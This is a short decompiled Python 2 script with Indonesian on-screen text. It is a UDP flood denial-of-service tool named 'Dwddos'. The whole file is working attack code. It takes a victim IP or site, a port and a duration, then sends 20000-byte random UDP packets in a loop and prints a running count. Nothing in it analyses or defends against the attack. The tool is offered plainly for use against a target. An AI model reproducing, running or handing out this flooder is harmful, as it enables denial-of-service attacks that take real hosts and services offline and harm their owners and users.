# uncompyle6 version 3.3.5
# Python bytecode 2.7
# Decompiled from: Python 2.7.16 (default, Jul  7 2019, 21:05:54) 
# [GCC 4.2.1 Compatible Android (5220042 based on r346389c) Clang 8.0.7 (https://
# Embedded file name: <s>
import time, socket, random, sys

def usage():
    print '\x1b[1;32mpython2 Dwddos.Py masukan ip atau nama web'


def flood(victim, vport, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(20000)
    timeout = time.time() + duration
    sent = 3000
    while 1:
        if time.time() > timeout:
            break
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print '\x1b[1;91mMemulai \x1b[1;94mm%s \x1b[1;91mmengirim paket \x1b[1;94m%s \x1b[1;91mpada port \x1b[1;32m%s ' % (sent, victim, vport)


def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))


if __name__ == '__main__':
    main()